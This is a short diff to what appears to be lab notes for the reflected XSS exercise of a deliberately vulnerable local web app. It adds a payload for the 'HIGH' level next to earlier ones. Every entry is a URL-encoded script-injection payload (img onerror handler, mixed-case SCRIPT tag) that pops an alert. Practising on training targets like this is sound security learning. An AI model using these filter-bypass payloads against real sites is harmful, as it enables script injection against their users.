@@ -6,3 +6,7 @@ http://127.0.0.1/vulnerabilities/xss_r/?name=%3Cimg%20src=%27x%27%20onerror=%22a
 
 or using cAse sENSiTiVE
 http://127.0.0.1/vulnerabilities/xss_r/?name=%3CSCRIPT%3Ealert(%221%22);%3C/SCRIPT%3E
+
+[HIGH]
+Using HTML events
+http://127.0.0.1/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=%22alert(%271%27)%22/%3E
